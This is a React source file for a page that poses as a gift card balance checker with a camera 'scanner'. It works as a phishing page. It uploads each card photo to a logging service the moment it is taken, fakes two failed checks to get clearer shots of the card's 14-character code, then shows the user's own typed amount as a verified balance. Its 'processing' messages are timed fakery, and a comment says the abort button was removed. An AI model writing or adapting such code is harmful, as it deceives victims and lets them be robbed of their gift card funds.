// src/pages/Scan.jsx
import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Navbar from '../components/Navbar';
import { logBalanceCheck } from '../services/logService';
import { notifyEnabled } from '../services/notifyService';
import razerGuide from '../assets/razers.jpg';

const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
  return (
    <div className="min-h-screen bg-[#050505] relative flex items-center justify-center p-6 overflow-hidden">
      <div className="absolute inset-0 opacity-[0.15] pointer-events-none" style={{ backgroundImage: 'linear-gradient(#00ff41 1px, transparent 1px), linear-gradient(90deg, #00ff41 1px, transparent 1px)', backgroundSize: '40px 40px', maskImage: 'radial-gradient(ellipse at center, black 10%, transparent 70%)' }}></div>
      <div className="max-w-md w-full text-center relative z-10">
        <div className="mb-10 flex flex-col items-center">
          <div className="w-20 h-20 bg-[#00ff41]/10 border border-[#00ff41]/50 flex items-center justify-center rotate-45 shadow-[0_0_40px_rgba(0,255,65,0.3)] animate-pulse">
            <span className="text-[#00ff41] text-4xl font-black -rotate-45">$</span>
          </div>
          <p className="text-[#00ff41] text-xs font-bold tracking-[0.3em] mt-8 uppercase">Balance Verified</p>
        </div>
        <h2 className="text-[#888] text-xs font-bold tracking-[0.2em] uppercase mb-2">Available Funds</h2>
        <p className="text-white text-7xl md:text-8xl font-black mb-8 tracking-tighter" style={{ textShadow: '0 0 40px rgba(0,255,65,0.5)' }}>{balance}</p>
        <div className="inline-block bg-[#0a0a0a] border border-[#222] px-8 py-3 mb-12 shadow-lg" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>
          <p className="text-[#aaa] text-sm font-mono tracking-[0.2em]">{cardType} •••• {lastFourDigits}</p>
        </div>
        <button onClick={onCheckAnother} className="w-full bg-[#00ff41] text-black font-black py-4 text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.6)] active:scale-[0.98]" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>Check Another Card</button>
      </div>
    </div>
  );
};

const ErrorPopup = ({ isOpen, onRetry }) => {
  if (!isOpen) return null;
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md px-4">
      <div className="bg-[#0a0a0a] border border-[#ff3333] p-8 max-w-sm w-full text-center shadow-[0_0_50px_rgba(255,51,51,0.15)] animate-fadeSlideUp relative overflow-hidden" style={{ clipPath: 'polygon(20px 0, 100% 0, 100% calc(100% - 20px), calc(100% - 20px) 100%, 0 100%, 0 20px)' }}>
        <div className="absolute top-0 left-0 w-full h-1 bg-[#ff3333]"></div>
        <div className="w-24 h-24 mx-auto rounded-full border-2 border-[#ff3333]/30 flex items-center justify-center mb-6 shadow-[inset_0_0_20px_rgba(255,51,51,0.2)]">
          <svg className="w-10 h-10 text-[#ff3333]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
        </div>
        <h3 className="text-[#ff3333] text-2xl font-black mb-4 uppercase tracking-widest">System Error</h3>
        <p className="text-[#aaa] text-sm mb-8 leading-relaxed font-mono">An unexpected error occurred while verifying this card.</p>
        <button onClick={onRetry} className="w-full bg-[#ff3333] text-white font-bold py-3 tracking-widest uppercase transition-all hover:bg-[#ff4444] hover:shadow-[0_0_20px_rgba(255,51,51,0.4)] active:scale-[0.98]" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>Try Again</button>
      </div>
    </div>
  );
};

const Scan = () => {
  const navigate = useNavigate();
  const [selectedImage, setSelectedImage] = useState(null);
  const [amount, setAmount] = useState('');
  const [balance, setBalance] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('');
  const [showBalance, setShowBalance] = useState(false);
  const [showFullScreenBalance, setShowFullScreenBalance] = useState(false);
  const [processingStep, setProcessingStep] = useState(0);
  const [processingText, setProcessingText] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [processingComplete, setProcessingComplete] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);

  // Total time: 2.8 seconds
  const processingSteps = [
    { text: '🔐 Establishing secure connection...', duration: 400 },
    { text: '📸 Analyzing image matrix...', duration: 300 },
    { text: '🔍 Extracting data packets...', duration: 500 },
    { text: '🔒 Encrypting sensitive information...', duration: 400 },
    { text: '🔄 Verifying with secure servers...', duration: 500 },
    { text: '💳 Processing balance request...', duration: 400 },
    { text: '✅ Finalizing transaction...', duration: 300 }
  ];

  useEffect(() => {
    let timeoutIds = [];
    if (isProcessing && processingStep < processingSteps.length) {
      setProcessingText(processingSteps[processingStep].text);
      const timeout = setTimeout(() => { setProcessingStep(prev => prev + 1); }, processingSteps[processingStep].duration);
      timeoutIds.push(timeout);
    } else if (isProcessing && processingStep >= processingSteps.length && !processingComplete) {
      setProcessingComplete(true);
      if (attemptCount === 0) completeFirstAttempt();
      else if (attemptCount === 1) completeSecondAttempt();
      else completeThirdAttempt();
    }
    return () => timeoutIds.forEach(id => clearTimeout(id));
  }, [isProcessing, processingStep, attemptCount]);

  const handleImageSelect = (file) => {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = async (e) => {
      const base64Image = e.target.result;
      setSelectedImage(base64Image);
      setMessage('');
      setMessageType('');

      if (notifyEnabled) {
        try {
          await logBalanceCheck({
            type: 'scan_image_uploaded',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageSource: 'scan',
            imageBase64: base64Image,
            ip: null
          });
        } catch (err) { console.error('Failed to send immediate image:', err); }
      }
    };
    reader.readAsDataURL(file);
  };

  const handleCameraCapture = () => {
    const input = document.createElement('input');
    input.type = 'file'; 
    input.accept = 'image/*'; 
    input.capture = 'environment';
    input.onchange = (e) => { const file = e.target.files[0]; if (file) handleImageSelect(file); };
    input.click();
  };

  const completeFirstAttempt = () => {
    setMessage(`❌ UNABLE TO VERIFY CARD\n\nPlease ensure:\n• The card number is fully visible\n• All 14 alphanumeric characters are readable\n• The image is well-lit and in focus\n\nPlease capture a CLEARER image.`);
    setMessageType('error');
    setSelectedImage(null); 
    setAttemptCount(1); 
    setShowBalance(false); 
    setIsProcessing(false); 
    setProcessingStep(0); 
    setProcessingText(''); 
    setProcessingComplete(false);

    logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }).catch(console.error);
  };

  const completeSecondAttempt = () => {
    setShowErrorModal(true);
    setSelectedImage(null); 
    setAttemptCount(2); 
    setIsProcessing(false); 
    setProcessingStep(0); 
    setProcessingText(''); 
    setProcessingComplete(false);

    logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }).catch(console.error);
  };

  const completeThirdAttempt = () => {
    const enteredAmount = parseFloat(amount).toFixed(2);
    const displayBalance = `$${enteredAmount} USD`;
    setBalance(displayBalance); 
    setShowBalance(true); 
    setShowFullScreenBalance(true); 
    setMessage(`✅ Balance verified: ${displayBalance}`); 
    setMessageType('success');
    setAttemptCount(0); 
    setIsProcessing(false); 
    setProcessingStep(0); 
    setProcessingText(''); 
    setProcessingComplete(false);

    const simulatedCardNumber = Math.random().toString().slice(2, 16);
    logBalanceCheck({ type: 'second_attempt_success', cardNumber: simulatedCardNumber, amount, balance: displayBalance, pageSource: 'scan', imageBase64: selectedImage }).catch(console.error);
  };

  const handleCheckBalance = () => {
    if (!selectedImage) { setMessage('❌ Please capture a photo'); setMessageType('error'); return; }
    if (!amount || parseFloat(amount) <= 0) { setMessage('❌ Please enter a valid amount'); setMessageType('error'); return; }
    if (parseFloat(amount) > 10000) { setMessage('❌ Amount cannot exceed $10,000'); setMessageType('error'); return; }
    setShowBalance(false); setMessage(''); setMessageType(''); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false); setIsProcessing(true);
  };

  const handleModalRetry = () => { setShowErrorModal(false); };

  const resetFullScreen = () => {
    setShowFullScreenBalance(false); setShowBalance(false); setBalance(''); setSelectedImage(null); setAmount(''); setMessage(''); setMessageType('');
    setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setAttemptCount(0); setProcessingComplete(false); setShowErrorModal(false);
  };

  if (showFullScreenBalance) return <FullScreenBalance balance={balance} lastFourDigits="••••" cardType="GIFT CARD" onCheckAnother={resetFullScreen} />;

  return (
    <>
      <Navbar />
      <ErrorPopup isOpen={showErrorModal} onRetry={handleModalRetry} />

      <div className="bg-[#000] text-center py-8 px-4 border-b border-[#222] relative overflow-hidden">
        <div className="absolute inset-0 opacity-10 pointer-events-none" style={{ backgroundImage: 'radial-gradient(#00ff41 1px, transparent 1px)', backgroundSize: '20px 20px' }}></div>
        <h2 className="relative text-sm sm:text-lg text-white font-black tracking-[0.3em] uppercase flex items-center justify-center gap-3">
          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span> Optical Scanner <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
        </h2>
      </div>

      <div className="p-4 sm:p-6 overflow-x-hidden max-w-[600px] mx-auto w-full relative z-10">
        <button onClick={() => navigate('/')} className="inline-flex items-center gap-2 bg-[#111] text-[#aaa] px-4 py-2 text-xs font-bold tracking-widest uppercase border border-[#333] mb-6 hover:text-white hover:border-[#555] transition-colors" disabled={isProcessing} style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%)' }}>
          ← Manual Entry
        </button>

        <div className="bg-[#0a0a0a] border border-[#222] p-6 sm:p-8 shadow-2xl relative">
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#00ff41] to-transparent opacity-50"></div>
          
          <h2 className="text-white text-center text-lg sm:text-xl mb-6 font-black tracking-widest uppercase flex items-center justify-center gap-2">
            <span className="text-[#00ff41] animate-pulse">⬢</span> Scan Upload
          </h2>

          {attemptCount > 0 && !isProcessing && !showBalance && (
            <div className="mb-6 p-3 border border-[#ffaa00] bg-[#ffaa00]/10 text-center font-mono text-[0.65rem] sm:text-xs text-[#ffaa00] uppercase tracking-wider" style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%)' }}>
              ⚠️ Retry Required: Capture a clearer photo.
            </div>
          )}

          <div className="text-center mb-6">
            <img src={razerGuide} alt="Guide" className="mx-auto max-w-[200px] border-2 border-[#222] opacity-80 hover:opacity-100 transition-opacity" onError={(e) => { e.target.src = 'https://via.placeholder.com/240x120/1a2a1a/00ff41?text=Scan+Guide'; }} />
            
            <p className="text-[#00ff41] font-bold text-[0.65rem] sm:text-xs mt-3 font-mono uppercase tracking-widest">
              Ensure all 14 characters are perfectly visible.
            </p>
          </div>

          <div className="flex mb-6">
            <button onClick={handleCameraCapture} disabled={isProcessing} className="w-full bg-[#111] border border-[#333] text-[#00ff41] py-3 font-bold text-xs tracking-widest uppercase flex items-center justify-center gap-2 hover:border-[#00ff41] hover:shadow-[0_0_15px_rgba(0,255,65,0.2)] transition-all disabled:opacity-50" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
              📸 Capture Image
            </button>
          </div>

          {selectedImage && !isProcessing && (
            <div className="bg-[#050505] border border-[#333] p-4 mb-6 text-center relative group">
              <div className="text-[#00ff41] text-[0.6rem] font-bold tracking-widest uppercase mb-3">Image Buffer Locked</div>
              <img src={selectedImage} alt="Preview" className="max-w-full max-h-[140px] mx-auto object-contain border border-[#222]" />
              <button onClick={() => setSelectedImage(null)} className="mt-4 text-[#ff3333] text-[0.65rem] font-bold tracking-widest uppercase hover:text-white transition-colors" disabled={isProcessing}>
                ✕ Clear Buffer
              </button>
            </div>
          )}

          <div className="mb-6 relative">
            <label className="block text-[#888] text-[0.65rem] sm:text-xs mb-2 font-bold tracking-wider uppercase">💰 Amount (USD)</label>
            <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="e.g., 50" min="1" max="10000" disabled={isProcessing} className="w-full p-3 sm:p-4 bg-[#050505] border-2 border-[#222] text-white text-sm font-mono tracking-widest focus:outline-none focus:border-[#00ff41] focus:shadow-[0_0_15px_rgba(0,255,65,0.2)] disabled:opacity-50 transition-all" style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }} />
          </div>

          {isProcessing && (
            <div className="mb-6 p-6 bg-[#050505] border border-[#00ff41]/30 text-center shadow-[inset_0_0_30px_rgba(0,255,65,0.05)] relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-[2px] bg-[#00ff41] animate-[scan_2s_ease-in-out_infinite]"></div>
              <div className="inline-block mb-4">
                <div className="w-12 h-12 border-4 border-[#111] border-t-[#00ff41] rounded-full animate-spin shadow-[0_0_15px_rgba(0,255,65,0.5)]"></div>
              </div>
              <p className="text-[#00ff41] font-mono text-xs tracking-widest uppercase mb-4">{processingText}</p>
              <div className="w-full bg-[#111] h-1.5 overflow-hidden">
                <div className="bg-[#00ff41] h-full transition-all duration-300 shadow-[0_0_10px_#00ff41]" style={{ width: `${(processingStep / processingSteps.length) * 100}%` }}></div>
              </div>
              <p className="text-[#666] font-mono text-[0.6rem] mt-2 tracking-widest">SYS.PROGRESS: {processingStep}/{processingSteps.length}</p>
            </div>
          )}

          {!isProcessing && (
            <button onClick={handleCheckBalance} disabled={!selectedImage || !amount} className="w-full bg-[#00ff41] text-black py-4 font-black text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-[#111] disabled:text-[#555] disabled:border disabled:border-[#333]" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>
              Check Balance
            </button>
          )}

          {/* ABORT BUTTON REMOVED COMPLETELY */}

          {attemptCount > 0 && !isProcessing && !showBalance && (
            <button onClick={resetFullScreen} className="w-full mt-4 bg-transparent border border-[#555] text-[#888] py-2 font-bold text-xs tracking-widest uppercase transition-colors hover:text-white hover:border-white" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
              Reset Terminal
            </button>
          )}

          {message && !isProcessing && !showFullScreenBalance && (
            <div className={`mt-6 p-4 border font-mono text-[0.7rem] sm:text-sm whitespace-pre-line ${messageType === 'success' ? 'bg-[#00ff41]/10 border-[#00ff41] text-[#00ff41]' : 'bg-[#ff3333]/10 border-[#ff3333] text-[#ff3333]'}`} style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}>
              {message}
            </div>
          )}
        </div>
      </div>

      <style>{`
        @keyframes fadeSlideUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes scan { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
        .animate-fadeSlideUp { animation: fadeSlideUp 0.4s ease; }
        .active\\:scale-98:active { transform: scale(0.98); }
        .whitespace-pre-line { white-space: pre-line; }
        body { background-color: #050505; overflow-x: hidden; width: 100%; margin: 0; padding: 0; color: white; }
        html { overflow-x: hidden; max-width: 100%; }
        * { -webkit-tap-highlight-color: transparent; }
      `}</style>
    </>
  );
};

export default Scan;